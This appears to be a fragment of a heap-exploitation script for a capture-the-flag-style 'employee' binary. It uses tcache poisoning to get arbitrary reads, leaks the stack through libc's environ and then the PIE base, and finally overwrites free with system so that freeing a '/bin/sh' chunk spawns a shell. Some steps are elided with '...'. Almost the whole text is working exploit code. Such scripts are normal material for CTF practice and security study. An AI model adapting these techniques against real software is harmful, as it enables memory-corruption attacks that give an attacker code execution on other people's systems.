...
# tcache p -> chunk in emp name size -> arb read
# leak stack
first = hire(b'C' * 0x10)
...
hire(b'D' * 0x70)
hire(b'D' * 0x70)
emp = hire(p64(0x30) + p64(libc_base + libc.sym['environ']))
leak_name = show(aligned_emp, leak_name=1)
stack = leak_name
print("STACK: ", hex(stack))
pie_on_stack = stack - 0x7f8
...
hire(b'D' * 0x70)
hire(b'D' * 0x70)
emp = hire(p64(0x30) + p64(pie_on_stack - 0x20))
leak_name = show(aligned_emp, leak_name=1)
pie_base = leak_name - 0x31e4
print("PIE_BASE: ", hex(pie_base))


# overwrite free to system + loli with entries
first = hire(b'C' * 0x10)
fire(first)
first = hire(b'C' * 0x10)
second = hire(b'D' * 0x70)
...
emp = hire(p64(libc_base + SYSTEM_OFFSET) + p64(libc_base + PUTS_OFFSET) + p64(libc_base + PRINTF_OFFSET)) # this one was nasharu
fire(binsh_employee)
